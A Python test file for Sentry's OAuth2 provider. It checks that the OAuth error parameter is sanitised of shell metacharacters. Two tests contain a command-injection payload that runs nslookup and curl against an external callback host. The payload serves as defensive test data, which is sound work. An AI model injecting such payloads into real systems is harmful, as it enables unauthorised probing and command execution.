from collections.abc import Mapping
from functools import cached_property
from typing import Any
from unittest.mock import MagicMock, patch

import pytest
from django.test import Client, RequestFactory

from sentry.auth.exceptions import IdentityNotValid
from sentry.auth.providers.oauth2 import OAuth2Callback, OAuth2Provider, sanitize_oauth_error
from sentry.models.authidentity import AuthIdentity
from sentry.models.authprovider import AuthProvider
from sentry.testutils.cases import TestCase
from sentry.testutils.silo import control_silo_test


class DummyOAuth2Provider(OAuth2Provider):
    name = "dummy"
    key = "oauth2_dummy"

    def get_client_id(self) -> str:
        raise NotImplementedError

    def get_client_secret(self) -> str:
        raise NotImplementedError

    def get_refresh_token_url(self) -> str:
        raise NotImplementedError

    def build_identity(self, state: Mapping[str, Any]) -> Mapping[str, Any]:
        raise NotImplementedError

    def build_config(self, state):
        raise NotImplementedError


@control_silo_test
class OAuth2ProviderTest(TestCase):
    @cached_property
    def auth_provider(self):
        return AuthProvider.objects.create(provider="oauth2", organization_id=self.organization.id)

    def test_refresh_identity_without_refresh_token(self) -> None:
        auth_identity = AuthIdentity.objects.create(
            auth_provider=self.auth_provider,
            user=self.user,
            data={"access_token": "access_token"},
        )

        provider = DummyOAuth2Provider()
        with pytest.raises(IdentityNotValid):
            provider.refresh_identity(auth_identity)


class TestSanitizeOAuthErrorAuth(TestCase):
    """Test suite for sanitize_oauth_error function in auth OAuth2."""

    def test_sanitize_command_injection_payload(self) -> None:
        """Test that command injection payloads are sanitized."""
        malicious_input = "$(nslookup -q=cname hitocikwxxpaw71102.bxss.me||curl hitocikwxxpaw71102.bxss.me)"
        sanitized = sanitize_oauth_error(malicious_input)
        
        # Should not contain dangerous characters
        assert "$" not in sanitized
        assert "(" not in sanitized
        assert ")" not in sanitized
        assert "|" not in sanitized
        assert "nslookup" in sanitized  # Safe text should remain
        assert "curl" in sanitized  # Safe text should remain
        
    def test_sanitize_preserves_safe_text(self) -> None:
        """Test that legitimate error messages are preserved."""
        safe_input = "access_denied The user cancelled the request"
        sanitized = sanitize_oauth_error(safe_input)
        
        assert sanitized == safe_input


@control_silo_test
class OAuth2CallbackMaliciousErrorTest(TestCase):
    """Test suite for OAuth2Callback handling of malicious error parameters."""

    def setUp(self) -> None:
        super().setUp()
        self.request_factory = RequestFactory()
        
    @cached_property
    def view(self):
        return OAuth2Callback(
            access_token_url="https://example.org/oauth/token",
            client_id=123456,
            client_secret="secret-value",
        )

    @patch("sentry.auth.helper.AuthHelper.error")
    def test_malicious_error_parameter_is_sanitized(self, mock_error: MagicMock) -> None:
        """Test that malicious error parameters are sanitized before being passed to pipeline.error()."""
        from sentry.auth.helper import AuthHelper
        
        malicious_error = "$(nslookup -q=cname hitocikwxxpaw71102.bxss.me||curl hitocikwxxpaw71102.bxss.me)"
        
        request = self.request_factory.get(
            "/auth/sso/",
            {"error": malicious_error}
        )
        request.subdomain = None
        request.session = Client().session
        
        # Create a mock pipeline
        pipeline = MagicMock(spec=AuthHelper)
        pipeline.error = mock_error
        
        self.view.dispatch(request, pipeline)
        
        # Verify that error was called with sanitized input
        assert mock_error.called
        called_error = mock_error.call_args[0][0]
        
        # Should not contain dangerous characters
        assert "$" not in called_error
        assert "(" not in called_error
        assert ")" not in called_error
        assert "||" not in called_error
